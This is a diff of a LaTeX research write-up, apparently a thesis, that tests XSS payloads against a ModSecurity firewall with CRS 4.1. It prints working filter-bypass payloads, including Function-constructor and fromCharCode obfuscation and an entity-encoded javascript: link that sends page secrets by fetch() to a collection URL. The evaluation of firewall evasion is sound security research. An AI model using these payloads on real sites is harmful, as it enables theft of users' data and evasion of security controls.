@@ -153,7 +153,7 @@ the resulting \acrshort{html} code did not execute the given statements inside t
 In order to avoid the splitting of statements synchronous to whitespaces in the payload string, JavaScript comment interference was used.
 According to the JavaScript comment substitution technique stated under Section~\ref{sec:jscommentsub}, all whitespaces were replaced by JavaScript comments, creating the payload:
 
-\begin{lstlisting}[style=basicStyle, language=Python, caption=function constructor bypass payload using square bracket notation, label={lst:funconbypasssbn}]
+\begin{lstlisting}[style=basicStyle, language=Python, caption=function constructor + string concatenation bypass in square bracket notation, label={lst:funconbypasssbn}]
 []['constructor']['constructor'](`var/**/s/**/=/**/'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()
 \end{lstlisting}
 
@@ -168,7 +168,7 @@ A request containing this payload bypassed the firewall. After injecting it into
 
 Similarly, using the dot-syntax instead of bracket-access, the following valid payload bypasses the firewall:
 
-\begin{lstlisting}[style=basicStyle, caption=function constructor bypass payload using dot notation, language=Python]
+\begin{lstlisting}[style=basicStyle, caption=function constructor + string concatenation bypass in dot notation, language=Python]
 [].constructor.constructor(`var/**/s/**/=/**/'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()
 \end{lstlisting}
 
@@ -195,7 +195,7 @@ This payload successfully bypassed the ModSecurity firewall configured to use th
 
 On evaluating this payload against the tested firewall, the newly applied obscurity triggered a different filtering rule:
 
-\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss payload blocked, label={lst:storedxssblocked}]
+\begin{lstlisting}[style=ruleStyle, language=XML]
 <payload>
 [].map.constructor('[].map.constructor('+'String.'+'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)'+')();')();
 </payload>
@@ -231,6 +231,14 @@ Uncaught SyntaxError: expected expression, got ']'
 \end{lstlisting}
 
 JavaScript is able to automatically insert some semicolons to create valid syntax from statements where the semicolons have been omitted. JavaScript's automatic semicolon insertion rules are stated under \cite{js/autosemi}. Limitations, that arise when accessing the \verb|Function()| constructor with the syntax used in this subsection, are laid out under Section~\ref{sec:functionconstructor} and Section~\ref{sec:payloadlimitations}.
+
+As no such limitations apply where the payload is injected during validation in the context of this evaluation, the payload with the semicolon removed:
+
+\begin{lstlisting}[style=basicStyle, language=Python, caption=fromCharCode() bypass]
+[].map.constructor('[].map.constructor('+'String.'+'fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29)'+')();')();
+\end{lstlisting}
+
+successfully bypassed the ModSecurity firewall using \acrshort{crs} 4.1 and validated on the target.
 
 
 \subsubsection{Avoiding ()}
@@ -498,7 +506,7 @@ successfully bypassed the ModSecurity firewall using \acrshort{crs} 4.1.
 \subsubsection{HTML Character References + JavaScript normal character escape}
 
 \label{sec:htmlencjsesc}
-The following payload could be used by an attacker intending to exploit a stored XSS vulnerability to exfiltrate secrets:
+The following payload could be used by an attacker intending to exploit a XSS vulnerability to exfiltrate secrets:
 
 \begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
 <a href=javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret='+secret,data)>ClickMeFor$</a>
@@ -506,7 +514,7 @@ The following payload could be used by an attacker intending to exploit a stored
 
 A request containing this payload was blocked by the ModSecurity firewall using \acrshort{crs} 4.1 based on 4 rule triggers:
 
-\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored XSS blocked, label={lst:storedxssblocked}]
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=secret exfiltration XSS blocked, label={lst:storedxssblocked}]
 <payload><a href=javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret='+secret,data)>ClickMeFor$</a></payload>
 
 <message>"Possible Server Side Request Forgery (SSRF) Attack: Cloud provider metadata URL in Parameter"</message>
@@ -556,7 +564,7 @@ The bypassing payload:
 After injecting this payload into the \acrshort{html} document during validation, it turned out that the resulting \acrshort{html} code was split according to the whitespaces given in the JavaScript statements. A similar case to what was observed in Section~\ref{sec:funconstrconbypass}.
 Whitespaces contained in the JavaScript statements of the bypassing but invalid payload were substituted by comments to create the payload:
 
-\begin{lstlisting}[style=basicStyle, caption=stored XSS bypass, language=Python, escapeinside=\^\^]
+\begin{lstlisting}[style=basicStyle, caption=secret exfiltration XSS bypass, language=Python, escapeinside=\^\^]
 <a href=j&^\#^97vascript:var/**/secret/**/=/**/document.getElementsByName('name')[0]&^\#^46innerHTML;var/**/data/**/=/**/{body:secret,method:'POST'};fetch('http:\//localhost:3001/api/ping?secret='+secret,data)>ClickMeFor$</a>
 \end{lstlisting}
 
